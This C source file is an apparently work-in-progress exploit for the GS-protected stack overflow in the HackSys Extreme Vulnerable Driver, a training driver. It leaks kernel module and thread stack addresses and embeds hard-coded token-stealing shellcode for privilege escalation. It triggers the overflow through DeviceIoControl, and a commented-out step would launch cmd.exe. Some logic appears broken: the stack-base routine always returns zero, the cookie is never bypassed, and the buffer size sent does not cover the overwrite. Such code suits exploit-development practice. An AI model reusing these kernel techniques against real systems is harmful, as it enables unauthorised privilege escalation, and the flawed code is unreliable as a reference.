#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include "../HEVDExploit/helper.h"

#pragma comment(lib,"ntdll.lib")

ULONG64 getStackBase() {
        NTSTATUS status;
        ULONG i=0;
        PSYSTEM_EXTENDED_PROCESS_INFORMATION processInfo;

        processInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Allocate memory for the module list
        if (!processInfo) {
                printf("VirtualAlloc failed (%d)\n", GetLastError());
                return -1;
        }

        if (!NT_SUCCESS(status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemExtendedProcessInformation, processInfo, 1024 * 1024, NULL))) {
                printf("NtQuerySystemInformation failed(%#x)\n", status);
                VirtualFree(processInfo, 0, MEM_RELEASE);
                return -1;
        }

        ULONG64 stackBase = 0;
        while (processInfo->NextEntryOffset != NULL) {
                //if (lstrcmpW(processInfo->ImageName.Buffer, L"System") == 0) {
                        for (int i = 0; i < processInfo->NumberOfThreads; i++) {
                                //stackBase = (ULONG64)processInfo->Threads[i].StackBase;
                                printf("%d :  Stack Base = %p\n", i, processInfo->Threads[i].StackBase);
                        }
                //}
                processInfo =(PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)processInfo + processInfo->NextEntryOffset);
        }

        VirtualFree(processInfo, 0, MEM_RELEASE);
        return stackBase;
}

ULONG64 getDrvBase(const char* drvName) {
        NTSTATUS status;
        ULONG i;
        PRTL_PROCESS_MODULES ModuleInfo;

        ModuleInfo = (PRTL_PROCESS_MODULES)VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Allocate memory for the module list
        if (!ModuleInfo) {
                printf("VirtualAlloc failed (%d)\n", GetLastError());
                return -1;
        }

        if (!NT_SUCCESS(status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, ModuleInfo, 1024 * 1024, NULL))) {
                printf("NtQuerySystemInformation failed(%#x)\n", status);
                VirtualFree(ModuleInfo, 0, MEM_RELEASE);
                return -1;
        }

        ULONG64 drvBase = 0;
        printf("looking for %s ....", drvName);
        for (i = 0; i < ModuleInfo->NumberOfModules; i++) {
                if (strcmp((const char*)ModuleInfo->Modules[i].FullPathName + ModuleInfo->Modules[i].OffsetToFileName, drvName) == 0) {
                        drvBase = (ULONG64)ModuleInfo->Modules[i].ImageBase;
                        printf("\n%s : Image Base = %p\n",drvName, (PVOID64)drvBase);

                }
        }
        VirtualFree(ModuleInfo, 0, MEM_RELEASE);

        return drvBase;
}

int main() {
        HANDLE hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
                GENERIC_WRITE, FILE_SHARE_WRITE,
                nullptr, OPEN_EXISTING, 0,
                nullptr
        );
        if (hDevice == INVALID_HANDLE_VALUE) {
                printf("Failed to open device");
                return -1;
        }

        ULONG secCookieOffset = 0x3000;
        ULONG64 drvBase = getDrvBase("HEVD.sys");
        if (drvBase < 0) {
                printf("Getting Driver Base failed\n");
                return -1;
        }

        ULONG64 secCookieAddr = drvBase + secCookieOffset ;
        printf("&__security_cookie = %p\n", (PVOID64)secCookieAddr);

        getStackBase();

        char EoP[] = "\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x40\x70\x48\x89\xc1\x49\x89\xcb\x49\x83\xe3\x07\x48\xc7\xc2\x04\x00\x00\x00\x48\x8b\x80\x88\x01\x00\x00\x48\x2d\x88\x01\x00\x00\x48\x39\x90\x80\x01\x00\x00\x75\xea\x48\x8b\x90\x08\x02\x00\x00\x48\x83\xe2\xf0\x4c\x09\xda\x48\x89\x91\x08\x02\x00\x00\x31\xc0\x48\x83\xc4\x28\xc3";
        char* shellcode = (char*)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (shellcode == NULL) {
                printf("VirtualAlloc failed");
                return -1;
        }
        ULONG64* payload = (ULONG64*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);
        if (payload == NULL) {
                printf("HeapAlloc failed");
                return -1;
        }
        memset(payload, 0x61, 0x820);

        memcpy(shellcode, EoP, sizeof(EoP));
        payload[0x103] = (ULONG64)shellcode;

        DWORD returned;
        BOOL success = DeviceIoControl(hDevice,
                HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS,
                payload, 0x100,
                nullptr, 0,
                &returned, nullptr
        );

        /*

        if (success) {
                printf("Overflow triggered");
                WinExec("C:\\Windows\\System32\\cmd.exe", SW_SHOWNORMAL);
        }
        else
                printf("Failed");
        */
        CloseHandle(hDevice);

        return 0;
}